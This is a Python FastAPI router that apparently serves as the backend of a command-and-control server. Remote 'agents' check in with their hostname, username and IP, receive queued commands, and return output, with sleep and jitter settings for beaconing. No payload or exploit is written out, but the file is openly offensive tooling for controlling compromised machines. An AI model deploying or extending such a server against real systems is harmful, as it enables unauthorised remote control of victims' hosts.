from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from db.database import get_db
from models.agent import Agent
from models.task import Task
from core.ws_manager import manager
from pydantic import BaseModel
from datetime import datetime
import asyncio

router = APIRouter(prefix="/api/agents", tags=["agents"])

class AgentCheckin(BaseModel):
    hostname: str
    username: str
    os: str
    arch: str
    ip: str

class TaskResult(BaseModel):
    task_id: str
    output: str
    status: str

@router.post("/checkin")
def agent_checkin(data: AgentCheckin, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(
        Agent.hostname == data.hostname,
        Agent.username == data.username
    ).first()

    if not agent:
        agent = Agent(**data.model_dump())
        db.add(agent)
    else:
        agent.last_seen = datetime.utcnow()
        agent.is_active = True

    db.commit()
    db.refresh(agent)

    pending = db.query(Task).filter(
        Task.agent_id == agent.id,
        Task.status == "pending"
    ).first()

    if pending:
        pending.status = "running"
        db.commit()

    return {
        "agent_id": agent.id,
        "sleep": agent.sleep,
        "jitter": agent.jitter,
        "task": {"id": pending.id, "command": pending.command} if pending else None
    }

@router.post("/{agent_id}/result")
async def submit_result(agent_id: str, result: TaskResult, db: Session = Depends(get_db)):
    task = db.query(Task).filter(Task.id == result.task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    task.output = result.output
    task.status = result.status
    task.completed_at = datetime.utcnow()
    db.commit()

    event = {
        "type": "task_update",
        "task_id": task.id,
        "agent_id": agent_id,
        "output": result.output,
        "status": result.status,
    }
    await manager.broadcast_task_update(agent_id, event)
    await manager.broadcast_task_update("__all__", event)

    return {"status": "ok"}

@router.get("/")
def list_agents(db: Session = Depends(get_db)):
    return db.query(Agent).all()

@router.get("/{agent_id}/tasks")
def get_tasks(agent_id: str, db: Session = Depends(get_db)):
    return db.query(Task).filter(Task.agent_id == agent_id).order_by(Task.created_at.desc()).all()

@router.patch("/{agent_id}/sleep")
def update_sleep(agent_id: str, sleep: int, jitter: int = 1, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.sleep = str(sleep)
    agent.jitter = str(jitter)
    db.commit()
    return {"status": "ok"}


class AgentNotesUpdate(BaseModel):
    notes: str = ""
    tags: str = ""


@router.patch("/{agent_id}/notes")
def update_notes(agent_id: str, data: AgentNotesUpdate, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.notes = data.notes
    agent.tags = data.tags
    db.commit()
    return {"status": "ok"}


@router.delete("/{agent_id}")
def delete_agent(agent_id: str, db: Session = Depends(get_db)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    db.query(Task).filter(Task.agent_id == agent_id).delete()
    db.delete(agent)
    db.commit()
    return {"status": "deleted"}


@router.post("/heartbeat-check")
def heartbeat_check(db: Session = Depends(get_db)):
    """Mark agents as inactive if not seen in 5 minutes."""
    from datetime import timedelta
    threshold = datetime.utcnow() - timedelta(minutes=5)
    stale = db.query(Agent).filter(Agent.last_seen < threshold, Agent.is_active == True).all()
    count = 0
    for a in stale:
        a.is_active = False
        count += 1
    db.commit()
    return {"marked_inactive": count}
